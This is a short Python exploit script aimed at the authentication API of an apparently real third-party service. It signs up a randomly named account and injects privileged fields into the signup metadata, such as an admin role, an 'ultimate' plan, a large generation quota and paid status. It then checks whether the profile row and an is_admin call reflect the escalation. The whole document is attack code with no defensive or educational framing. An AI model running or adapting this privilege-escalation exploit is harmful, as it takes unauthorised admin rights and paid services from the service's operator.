import ssl, json, urllib.request, urllib.error, random, string

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"

def req(method, url, body=None, token=None, extra=None):
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY,
         "Content-Type": "application/json;charset=UTF-8"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
email = f"ratmeta{suffix}@gmail.com"
pw = "Xr9!kQ2#mZ7$pLw1"

print(f"=== signup {email} with profile field injection in data ===")
st, txt = req("POST", f"{SUPA}/auth/v1/signup", body={
    "email": email,
    "password": pw,
    "data": {
        "email": email,
        "generations_left": 5000,
        "activePlan": "ultimate",
        "role": "admin",
        "banned": False,
        "payment_status": "paid",
        "last_payment_date": "2026-11-11T00:00:00Z",
        "secret_key": "meta-secret-1",
        "auto_delete_enabled": False,
        "auto_delete_days": 30,
    },
})
print(st, txt[:300])
try:
    sess = json.loads(txt)
    tok = sess["access_token"]
    uid = sess["user"]["id"]
    print("uid:", uid)
    st2, txt2 = req("GET", f"{SUPA}/rest/v1/profiles?select=*&user_id=eq.{uid}",
                    token=tok)
    print("profile row:", st2, txt2[:700])
    st3, txt3 = req("POST", f"{SUPA}/rest/v1/rpc/is_admin", token=tok)
    print("is_admin:", st3, txt3[:100])
except Exception as e:
    print("err", e)
